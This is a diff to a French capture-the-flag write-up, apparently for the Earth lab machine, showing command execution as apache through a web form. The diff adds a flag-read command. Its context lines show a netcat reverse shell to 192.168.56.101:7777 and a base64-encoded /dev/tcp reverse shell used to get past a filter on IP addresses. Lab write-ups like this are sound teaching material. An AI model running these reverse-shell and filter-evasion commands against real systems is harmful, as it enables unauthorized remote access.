@@ -142,6 +142,7 @@ Me voilà identifié !
 Sur cette nouvelle page, je suis en présence d'un formulaire qui me permet d'exécuter des commandes :
 - whoami => apache
 - id => uid=48(apache) gid=48(apache) groups=48(apache)
+- cat /var/earth_web/user_flag.txt => [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
 - nc -e /bin/sh 192.168.56.101 7777
 
 Avec cette dernière commande, j'ai le message ```Remote connections are forbidden``` qui s'affiche.  
@@ -150,3 +151,4 @@ L'utilisation d'une adresse IP dans la commande est interdite !
 Je vais donc contourner ce problème en encodant ma commande : ```echo "sh -i >& /dev/tcp/192.168.56.101/7777 0>&1" | base64```
 
 Puis je l'exécute de cette manière : ```echo "c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDEvNzc3NyAwPiYx" | base64 -d | sh```
+
